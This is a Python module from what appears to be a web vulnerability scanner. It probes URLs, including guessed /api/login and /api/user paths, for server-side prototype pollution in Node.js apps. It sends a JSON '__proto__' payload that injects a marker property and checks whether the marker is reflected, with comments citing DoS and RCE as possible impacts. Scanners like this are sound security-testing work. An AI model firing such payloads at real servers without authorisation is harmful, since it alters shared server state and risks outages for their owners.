import asyncio
import json
from modules.core import console

# Server-Side Prototype Pollution
# Vulnerability: NodeJS apps merging JSON payloads into objects.
# Attack: { "__proto__": { "polluted": true } }
# Impact: DoS, RCE, Logic Bypass.

async def check_proto_server(session, url):
    try:
        # We need a POST endpoint that accepts JSON.
        headers = {"Content-Type": "application/json"}
        
        # Payload: Modify "toString" or a custom property.
        # Modifying toString might crash the server (DoS), so be careful.
        # We try a benign property "snakebite_polluted".
        
        payload = {
            "__proto__": {
                "snakebite_polluted": "true"
            }
        }
        
        # 1. Send Pollution
        async with session.post(url, json=payload, headers=headers, timeout=5, ssl=False) as resp:
            await resp.read()
            
        # 2. Check for Pollution (Probe)
        # If pollution worked, every object on the server might now have "snakebite_polluted": "true".
        # We check if it comes back in a regular GET request or another JSON response.
        
        async with session.get(url, timeout=5, ssl=False) as resp2:
            text = await resp2.text()
            
            # Note: This is a shared-state vulnerability. 
            # If we see "snakebite_polluted" in the response where it shouldn't be, we won.
            # OR if we see it reflected in specific error messages.
            
            # Another check: Send a payload relying on defaults.
            # { "a": 1, "__proto__": { "b": 2 } } -> Response should contain b:2 if polluted.
            
            if "snakebite_polluted" in text:
                 return {
                    "url": url,
                    "type": "Server-Side Proto Pollution",
                    "evidence": "Injected property 'snakebite_polluted' found in response."
                }

    except Exception:
        pass
    return None

async def scan_proto_server(session, url):
    """
    Scan for Server-Side Prototype Pollution (NodeJS).
    """
    console.print(f"\n[bold cyan]--- Server-Side Proto Pollution ---[/bold cyan]")
    
    # Needs potential JSON endpoints
    targets = [url]
    # Heuristics: search for /api/ /login /register etc.
    if "api" not in url and ".json" not in url:
        targets.append(url.rstrip("/") + "/api/login")
        targets.append(url.rstrip("/") + "/api/user")
    
    results = []
    for t in targets:
        res = await check_proto_server(session, t)
        if res:
             console.print(f"  [bold red][!] PROTO POLLUTION CONFIRMED: {res['url']}[/bold red]")
             console.print(f"      Evidence: {res['evidence']}")
             results.append(res)
         
    if not results:
        console.print("[dim][-] No Server-Side pollution confirmed.[/dim]")
        
    return results
